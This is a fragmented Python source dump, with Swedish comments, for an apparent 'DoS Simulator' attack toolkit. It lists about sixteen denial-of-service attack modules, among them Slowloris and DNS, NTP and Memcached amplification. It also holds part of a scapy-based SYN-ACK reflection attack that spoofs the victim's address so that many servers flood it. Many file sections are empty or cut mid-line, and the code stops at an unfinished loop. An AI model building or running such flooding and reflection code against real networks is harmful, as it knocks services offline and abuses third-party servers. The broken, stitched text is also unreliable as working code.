# ==================== ATTACK 1: attacks/slowloris_attack.py ====================

# ==================== UPPDATERA: attacks/__init__.py ====================
"""
Attack moduler för DoS Simulator - UPPDATERAD med alla attacker
"""
from .icmp_attack import ICMPAttack
from .ssh_attack import SSHAttack
from .http_attack import HTTPAttack, HTTPPayloadAttack
from .udp_attack import UDPAttack
from .multi_attack import MultiProtocolAttack

# Nya avancerade attacker
from .slowloris_attack import SlowlorisAttack
from .dns_amplification_attack import DNSAmplificationAttack
from .ack_flood_attack import ACKFloodAttack
from .ntp_amplification_attack import NTPAmplificationAttack
from .fragmentation_attack import FragmentationAttack
from .ssdp_amplification_attack import SSDPAmplificationAttack
from .memcached_amplification_attack import MemcachedAmplificationAttack
from .land_attack import LandAttack
from .rudy_attack import RUDYAttack
from .syn_ack_reflection_attack import SYNACKReflectionAttack

__all__ = [
    # Grundläggande attacker
    'ICMPAttack',
    'SSHAttack',
    'HTTPAttack',
    'HTTPPayloadAttack',
    'UDPAttack',
    'MultiProtocolAttack',

    # Avancerade attacker
    'SlowlorisAttack',
    'DNSAmplificationAttack',
    'ACKFloodAttack',
    'NTPAmplificationAttack',
    'FragmentationAttack',
    'SSDPAmplificationAttack',
    'MemcachedAmplificationAttack',
    'LandAttack',
    'RUDYAttack',
    'SYNACKReflectionAttack'
]

# ==================== UPPDATERA: ddos_main.py ====================
# !/usr/bin/env python3


# ==================== ATTACK 2: attacks/dns_amplification_attack.py ====================
"
# ==================== ATTACK 3: attacks/ack_flood_attack.py ====================

# ==================== ATTACK 4: attacks/# ==================== ATTACK 5: attacks/fragmentation_attack.py ====================

# ==================== ATTACK 6: attacks/ssdp_amplification_attack.py ====================

# ==================== ATTACK 7: attacks/
# ==================== ATTACK 8: attacks/land_attack.py ====================

# ==================== ATTACK 9: attacks/

# ==================== ATTACK 10: attacks/syn_ack_reflection_attack.py ====================
"""
SYN-ACK Reflection Attack
Spoofar source till victim, får många servrar att svara med SYN-ACK
"""
from scapy.all import IP, TCP, Raw
import time
import random
from .base_attack import BaseAttack


class SYNACKReflectionAttack(BaseAttack):
    """SYN-ACK Reflection - Reflection attack using TCP handshake"""

    def get_attack_name(self):
        return "SYN-ACK Reflection"

    def execute(self, count=100, reflection_targets=None):
        """
        Kör SYN-ACK reflection attack
        reflection_targets: Lista med servrar att reflektera via
        """
        if reflection_targets is None:
            # Exempel targets (använd många servrar i verklig attack)
            reflection_targets = [
                f"192.168.1.{i}" for i in range(10, 50)  # 40 olika servrar
            ]

        self.print_header("SYN-ACK Reflection Attack", count=count)

        print("[*] SYN-ACK Reflection - Många servrar svarar till victim")
        print(f"[*] Använder {len(reflection_targets)} reflection-servrar")
        print(f"[*] Varje server skickar SYN-ACK till {self.target_ip}")

        self.start_time = time.time()
        self.packets_sent = 0

        # Vanliga öppna portar att prova
        common_ports = [80, 443, 22, 21, 25, 3389, 8080]

        for